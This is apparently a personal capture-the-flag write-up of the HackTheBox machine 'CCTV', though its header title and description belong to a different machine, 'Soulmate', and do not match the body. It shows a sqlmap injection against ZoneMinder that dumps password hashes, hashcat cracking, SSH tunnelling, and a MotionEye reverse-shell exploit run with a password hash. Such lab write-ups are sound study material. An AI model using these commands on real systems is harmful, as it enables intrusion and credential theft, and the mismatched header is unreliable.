---
layout: writeup
title: "Soulmate"
date: 2026-02-19
platform: HackTheBox
description: "Soulmate is an easy difficulty Linux machine that showcases exploitation of [CVE-2025-31161](https://nvd.nist.gov/vuln/detail/CVE-2025-31161), an authentication bypass vulnerability in CrushFTP, allowing players to access an admin user account. By uploading a malicious PHP file to the application's web root, remote command execution is achieved. For privilege escalation, [CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433), another remote command execution vulnerability in the Erlang/OTP SSH server is being exploited to gain `root` access."
image: /assets/Soulmate/soulmatelogo.png
---

On today's hacking i've been working on a machine called CCTV, it's an "easy" not so "easy" Linux machine from HackTheBox. This is an active machine so the paper i'm about to write will be published once the machine is retired so it doesn't affect the current season of HackTheBox.

![[CCTV.png]]

Us usual, I've started with the meta of all CTF's which is start with enumeration, specifically with nmap. I rann the following command and also, recently I've learned that it's a good behavior to export all the results into a file, this way come back to those results and compare them.

``nmap -p- --min-rate=5000 -Pn -n -sS 10.129.5.206 -oN portsv1.txt``
``-p- --> to scann all ports``
``--min-rate=5000 --> to send at least 5000 packets/s
``-Pn --> disable host discovery
``-n --> disable name resolution
``-sS --> Stealth Scan, faster and silent
``-oN --> export

![[cctvnmap1.png]]

After the first result, port 22 and 80, I ran the second nmap command to get more information about the services and it's versions.

``nmap -p22,80 -sCV 10.129.5.206 -oN portsv2.txt``
``-p22,80 --> specify the ports
``-sCV --> nmap scripts to get the information
``-oN --> export

![[cctvnmap2.png]]

After the nmap's, I went straight to the web to see what else I can discover here. I modified the file ``/etc/hosts`` and added the IP with the name  to make things easier and jumped directly into the web.

![[cctvweb.png]]

Seems to be a monitoring web to control cameras or offer a service related to surveillance. Clicking here and there and checking the source, ``robots.txt``, and other areas found the "Staff login" button that redirects to another directory -->

![[staffloginbutton.png]]

![[cctvzm.png]]

Tried to access to ``http://cctv.htb/zm`` and found a login page related to ZoneMinder. While looking for more information about ZoneMinder on the Internet I found that it has several vulnerabilities related to SQL Injections, time based and blind.  But that's not really useful to me because to abuse those vulnerabilities I need to be at least loged in, and check the version i'm facing to see if it's really vulnerable.

Found nothing about bypassing the login screen so I went straight to the most common thing which is check default credentials --> admin:admin. A classic.

![[zoneminderlogin.png]]

Voilà we're in.
Moved arround the interface to see what I can do, and, eventho i'm loged as admin, I don't have anything to check, there is no cameras, no events, just a few logs but nothing interesting. 
I found in the options screen that there are 3 users in total, and the user I got, admin, has the same rights as user mark, the highest tier user is superadmin.

![[userszm.png]]

After that, I went to ``feroxbuster`` to see if any other path escaped my sight but, I got nothing from it. 

![[cctvferoxbuster.png]]


Verified that I'm on a version that is vulnerable to CVE-2024-51482 blind sql injection.

![[zmversion.png]]

CVE-2024-51482 is a critical boolean-based SQL Injection vulnerability discovered in ZoneMinder
This flaw affects versions 1.37.* through 1.37.64 and allows authenticated attackers with low privileges to execute arbitrary SQL commands on the underlying database server.

|Metric|Value|
|---|---|
|**CVE ID**|CVE-2024-51482|
|**CVSS Score**|9.9 (Critical)|
|**Attack Vector**|Network|
|**Privileges Required**|Low|
|**User Interaction**|None|
|**Scope**|Changed|
|**Impact**|Confidentiality, Integrity, Availability - HIGH|
|**Patched Version**|1.37.65|
The vulnerability exists in the ``web/ajax/event.php`` file within the ``removetag`` function, but, as I said above, the interface is empty, there is no cameras and no events to check nor remove so I created a false camera, to generate a false event. This way I can create the perfect scenario to abuse the vulnerability
Added the minimal details to make it "work"

![[zoneminderfalsecamara.png]]


![[falsecamera.png]]

With the false camera created, I captured the packet that is sent when trying to access to the events section  with BurpSuite to see if i can add here the ``removetag`` thingy.
To my surprise theres a really big query with a lot of things added here, but I just need the 1 simple request with the ``removetag`` function in it so I reduced from this -->


![[burpeventcatch1.png|697]]

``/zm/index.php?view=request&request=event&action=removetag&tid=1``
``/zm/index.php?view=request&request=event&action=removetag&tid=1&id=1``

To this -->

![[burpeventcatch3.png]]

And it works, page returns code 200 so we are ready to go

![[burpeventcatch2.png]]

I'm gonna be honest here. I spent some time here in BurpSuite trying to create the query and avoid using sqlmap but that didn't work for me so, I decided to grab everything I need to run sqlmap properly and went to it.
Grabbed the ZMSESSID cookie, verified the default databases for ZoneMinder and ran the following command

![[zmcookie.png]]

``sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1&id=1' --cookie="ZMSESSID=oe645nieb6fh3lhk0ierjn217p" --data="tid=1&id=1" -p tid --dbms=mysql --technique=T --ignore-code=500 --batch -D zm -T Users -C Username,Password --dump ``

``--cookie --> my cookie
``--data --> Data string to be sent through POST
``-p --> testable parameter (it's next to the removetag)
``--dbms=mysql --> DB
``--technique=T --> Time based SQL Injection
``--ignore-code=500 --> Ignore code 500 Internal server error
``--batch --> never ask for user input, use the default behavior
``-D zm--> DBMS database to enumerate
``-T Users --> DBMS database tables to enumerate
``-C Username,Password --> DBMS database columns to enumerate
``--dump --> Dump DBMS database table entries



![[sqlmap.png]]

Gotcha. Got the Usernames and Hashed passwords from all users. The user:password from admin we already know it (admin:admin).
Judging by the aspect of these hashes seem to be bcrypt. Bcrypt hashes tend to be slow to crack, I hope it's not the case here

![[sqlmap2.png]]

```
superadmin:$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
admin:$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

Moved the hashes into a text and ran the following ``hashcat`` command -->

![[hashestxt.png]]

``hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt``
``-m 3200 --> bcrypt type
``/usr/share/wordlists/rockyou.txt --> wordlist

![[tch4vi.github/Writeups/CCTV/Images/hashcat.png]]

It took a bit but it discovered the hash from ``mark`` user, for the superadmin one ``hashcat`` is specifying that it will take at least 24 hours to test everything from the rockyou file. And hell no, i'm not waiting that long to be honest unless it's strictly needed.

mark user -->
``$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame``


Connected to ``cctv.htb`` via ssh with ``mark`` credentials. With that we should be able to get the user flag and privesc.

![[usershome.png]]

To my surprise, we are not able to get the user flag? Seems to be in another user ``sa_mark``
And the current directory from ``mark`` is completely empty, there is nothing to take information from, or I didn't see it

![[lshome.png]]

Checked if I'm able to run anything with sudo, and nothing

![[privesc1.png]]

Tried to find any file with the suid bit set on it, and nothing. Found  `pkexec` but the version installed is not vulnerable. In other machines we could abuse the ``pkexec`` file.

``find / -perm -4000 2>/dev/null

![[pkexec.png]]

After trying to find any file with the suid bit, or check if i'm able to run sudo with no results. A good choice to do privesc it's check the local services running. For that I ran the following command -->

``ss -tlnp``

![[privesc2.png]]

Found gold here. There is a lot of services running internally. I've verified every single one with ``curl`` but the only one that gave me something is the port ``8765``. I tunneled it with ``ssh`` to confirm what service is running

``ssh -L 8765:127.0.0.1:8765 mark@cctv.htb``


![[tunneling.png]]

Opened it with the browser ``localhost:8765``. boom.
Another surveillance service MotionEye.


![[motioneyescreen.png]]

Here I tried with the default admin credentials with no luck. 
If that doesn't work, the best option is run arround the config files and try to find anything relevant, users, passwords, hashes, salts anything that could lead to NOT spend 24 hours with ``hashcat`` and the ``superadmin`` bcrypted password

Found a different hash on ``motion.conf`` file. It's a ``SHA1`` hash -->

![[motionconf.png]]

``989c5a8ee87a0e9521ec81a79187d162109282f0``

Tried again with hashcat and eventho SHA1 shouldn't be as slow as bcrypt, I didn't had luck with the rockyou file and hashcat. Exhausted

![[hashcat2.png]]

![[hashcat3.png]]

On the ``motion.conf`` file there is specified the ``admin_username``, the ``admin_password``, and the ``normal_username`` which is ``user``, and the ``normal_password`` is empty. Apparently looks like I can log in with user and no password

![[userlogin.png]]

But there is nothing much I can do with the normal user. I can take some pics of the current camera (is full black) and nothing more. 
I searched information about Motioneye and the vulnerabilities that could have and there is one related to a RCE (CVE-2025-60787) that is pretty interesting because, it allows the attacker to get a reverse shell and with that I could grab the flag I want. At this point I'm not sure if i'm doing privesc. Seems more like lateral movement because, we jumped from ZoneMinder to MotionEye

MotionEye v0.43.1b4 and before is vulnerable to OS Command Injection in configuration parameters such as image_file_name. Unsanitized user input is written to Motion configuration files, allowing remote authenticated attackers with admin access to achieve code execution when Motion is restarted.

The only problem I'm facing here is that I have the ``admin`` user and the hashed password, and to exploit this vulnerability  I need the plain password. Or that's what I thought. Time to be honest here again, I've spent a lot trying to crack the hashed password with no luck and completely forgot about the concept ``pass-the-hash``. Big mistake from my side.

``Pass-the-hash`` is a type of attack that allows the attacker to authenticate into the system using the hashed password instead of the plain text password. The idea is "if the system accepts the hash as identity proof, I don't need to know the real password"
Lesson learned.

The provided python script for the CVE-2025-60787 works smothly with the hashed password. 

``python3 CVE-2025-60787.py revshell --url 'http://127.0.0.1:8765' --user 'admin' --password '989c5a8ee87a0e9521ec81a79187d162109282f0' -i 10.10.14.228 --port 4444``

![[cve202560787-2.png]]

Start listening port 4444 -->

![[nclvnp2.png]]

And it worked perfectly. I'm in with root privileges. I can run straight to all the flags and complete the machine

![[tch4vi.github/Writeups/CCTV/Images/whoami.png]]

![[tch4vi.github/Writeups/CCTV/Images/userflag.png]]

User flag-->

``b94f59d170316ea243a13e7fac489b42``


![[tch4vi.github/Writeups/CCTV/Images/rootflag.png]]

Root flag -->

``07763013af6bec48a91cd937b657c306``


![[machinesolved.png]]

Learned a lot from this machine. Always a pleasure playing on HackTheBox. Grinding :]
